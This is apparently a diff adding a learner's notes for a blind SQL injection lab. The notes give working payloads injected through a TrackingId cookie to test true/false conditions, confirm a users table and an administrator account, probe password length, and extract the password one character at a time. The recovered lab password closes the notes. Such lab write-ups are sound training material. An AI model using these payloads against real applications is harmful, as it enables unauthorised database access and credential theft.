@@ -1,0 +1,31 @@
+Lab: Blind SQL injection with conditional responses
+
+#trackingId go to the application and do an sql query to generate some data 
+step1:
+
+#we see if the track ID we use is the true one and it's the cookie we should use by testing by a true and false condition (true + true = true = welcome back // true+false =false= no welcome back message)
+
+TrackingId=...' AND '1'='1'--
+TrackingId=... AND '1'='2'--
+
+step2:
+#we see if the table that we need existe on the data base (users table) we have the true tracking id is a true condition we can add to this a true and false condition that test the existence of the users table.
+
+TrackingId=...' AND (SELECT 'a' FROM users LIMIT 1)='a #limite 1 just one caractaire 
+
+#if there is any carractaire on the users table = that the users table existe and it should give back a welcome back message because tracking id is true and users table existe which is  true (true +true = welcome back message=true)
+
+step3:
+#find if the useranme administrator exsist : we suppose that there is a table nommed users and inside of it there is a username administrator if our proposition is true: if we input a carractaire we should get it back = that the username exist and true + true = true then a welcome back message
+
+TrackingId=...'AND (select 'a' from users where username='administrator')='a
+step4:
+#Now we should find the password
+#we first should know the lenght of the password and then we will test letter by letter in the first carractaire and second and ... of the password.
+#to know the lenght we should test if the length is bigger than 1 if true it will be a welcome back message and >2 manually or you can use the intruder section in burp suite 
+
+'And (select 'a' from users where username='administrator' and length(password)>1)='a #tracking id =true /users table : true / usename = true if the welcome back message didn't appear because of lenght of the password is false
+#we do the same thing to test carractaire
+'And (select 'a' from users where username='administrator' and SUBSTRING(password, 1, 1)='a')='a
+#in intridure we do a brute forcer to find every carractaire
+password : duf8rw7f8reg73rl62mc
